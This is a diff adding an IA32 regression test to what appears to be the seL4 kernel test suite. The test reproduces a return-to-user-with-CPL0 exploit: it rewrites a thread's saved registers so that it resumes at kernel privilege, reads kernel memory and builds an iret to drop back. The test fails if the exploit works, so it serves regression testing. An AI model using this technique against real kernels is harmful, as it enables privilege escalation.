@@ -396,3 +396,109 @@ int test_ldrex_cleared(env_t env)
 }
 DEFINE_TEST(REGRESSIONS0002, "Test the load-exclusive monitor is cleared on context switch", test_ldrex_cleared)
 #endif
+
+#if defined(CONFIG_ARCH_IA32) && CONFIG_HAVE_TIMER
+static volatile int got_cpl = 0;
+static volatile uintptr_t stack_after_cpl = 0;
+static volatile uint32_t kernel_hash;
+void VISIBLE do_after_cpl_change(void) {
+    printf("XOR hash for first MB of kernel region 0x%x\n", kernel_hash);
+    test_check(false);
+    /* we don't have a stack to pop back up to message the test parent,
+     * but we can just fault, the result is that the test output
+     * will have a 'spurious' invalid instruction error, too bad */
+    asm volatile("hlt");
+}
+static int do_wait_for_cpl(void) {
+    /* check our current CPL */
+    uint16_t cs;
+    asm volatile("mov %%cs, %0" : "=r"(cs));
+    if ((cs & 3) == 0) {
+        got_cpl = 1;
+        /* prove we have root by doing something only the kernel can do */
+        /* like disabling interrupts */
+        asm volatile("cli");
+        /* let's hash a meg of kernel code */
+        int i;
+        uint32_t *kernel = (uint32_t*)0xe0000000;
+        for (i = 0; i < BIT(20) / sizeof(uint32_t); i++) {
+            kernel_hash ^= kernel[i];
+        }
+        /* take away our privileges (and put interupts back on) by constructing
+         * an iret. we need to lose root so that we can call the kernel again. We
+         * also need to stop using the kernel stack */
+        asm volatile(
+            "andl $0xFFFFFFE0, %%esp\n"
+            "push %[SS] \n"
+            "push %[STACK] \n"
+            "pushf \n"
+            "orl $0x200,(%%esp) \n"
+            "push %[CS] \n"
+            "push $do_after_cpl_change\n"
+            "iret\n"
+            :
+            : [SS]"r"(0x23),
+              [CS]"r"(0x1b),
+              [STACK]"r"(stack_after_cpl));
+        /* this is unreachable */
+    }
+    while (1) {
+        /* Sit here calling the kernel to maximize the chance that when the
+         * the timer interrupt finally fires it will actually happen when
+         * we are inside the kernel, this will result in the exception being
+         * delayed until we switch back to user mode */
+        seL4_Yield();
+    }
+    return 0;
+}
+
+int test_no_ret_with_cpl0(env_t env)
+{
+    helper_thread_t thread;
+    int error;
+
+    /* start a low priority helper thread that we will attempt to change the CPL of */
+    create_helper_thread(env, &thread);
+    start_helper(env, &thread, (helper_fn_t) do_wait_for_cpl, 0, 0, 0, 0);
+    stack_after_cpl = (uintptr_t)thread.thread.initial_stack_pointer;
+
+    /* start a timer the we will wait on */
+    error = timer_start(env->timer->timer);
+    test_eq(error, 0);
+    error = timer_periodic(env->timer->timer, NS_IN_S / 10);
+    test_eq(error, 0);
+
+    for (int i = 0; i < 20; i++) {
+        wait_for_timer_interrupt(env);
+        if (got_cpl) {
+            wait_for_helper(&thread);
+            break;
+        }
+        /* reset the helper threads registers */
+        seL4_UserContext context;
+        error = seL4_TCB_ReadRegisters(thread.thread.tcb.cptr, false, 0, sizeof(seL4_UserContext) / sizeof(seL4_Word), &context);
+        test_eq(error, 0);
+        context.eip = (seL4_Word)do_wait_for_cpl;
+        /* If all went well in the helper thread then the interrupt came in
+         * whilst it was performing a kernel invocation. This means the interrupt
+         * would have been masked until it performed a 'sysexit' to return to user.
+         * Should an interrupt occur right then, however, the trap frame that is
+         * constructed is to the 'sysexit' instruction, and the stored CS and SS
+         * are CPL0 (kernel privilege). Kernel privilige is needed because once this
+         * thread is resumed (via iret) we will resume at the sysexit (and hence will
+         * need kernel privilege), then the sysexit will happen forcively removing
+         * kernel privilege.
+         * Right now, however, the interrupt has occured and we have woken up. The
+         * below call to WriteRegisters will overwrite the return address (which
+         * was going to be sysexit) to our own function, which will then be running
+         * at CPL0 */
+        error = seL4_TCB_WriteRegisters(thread.thread.tcb.cptr, true, 0, sizeof(seL4_UserContext) / sizeof(seL4_Word), &context);
+        test_eq(error, 0);
+    }
+
+    cleanup_helper(env, &thread);
+
+    return sel4test_get_result();
+}
+DEFINE_TEST(REGRESSIONS0003, "Test return to user with CPL0 exploit", test_no_ret_with_cpl0)
+#endif /* defined(CONFIG_ARCH_IA32) && CONFIG_HAVE_TIMER */
